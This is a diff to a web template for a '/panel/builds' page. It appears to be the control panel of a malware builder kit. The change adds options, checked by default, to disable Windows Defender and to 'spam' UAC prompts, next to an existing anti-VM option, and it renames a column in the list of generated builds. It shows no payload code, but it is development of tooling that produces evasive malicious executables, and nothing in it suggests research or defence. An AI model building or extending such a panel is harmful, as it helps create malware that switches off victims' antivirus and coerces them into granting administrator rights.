@@ -41,13 +41,17 @@
                     {{/if}}
                     <form method="post" action="/panel/builds">
                         <div class="input-group">
-                            <input type="text" name="ico" id="ico" placeholder=".ico link / none" required>
-                            <label>Icon</label>
-                        </div>
-                        <div class="input-group">
                             <input type="text" name="name" id="name" placeholder="Name" required>
                             <label>Name</label>
                         </div>
+                        <label class="form-control">
+                            Disable Windows Defender
+                            <input type="checkbox" name="wdefender" id="wdefender" checked>
+                        </label>
+                        <label class="form-control">
+                            Uac Spam
+                            <input type="checkbox" name="uacspam" id="uacspam" checked>
+                        </label>
                         <label class="form-control">
                             Anti-Vm
                             <input type="checkbox" name="antivm" id="antivm" checked>
@@ -69,7 +73,7 @@
                             {{#each builds}}
                             <tr>
                                 <td>{{toLocal date}}</td>
-                                <td>{{log}}</td>
+                                <td>{{info}}</td>
                                 <td><a href="/panel/builds/delete?id={{_id}}" class="delete"><span class="material-icons-outlined delete">delete</span></a></td>
                                 <td>
                                     <a href="{{path}}">
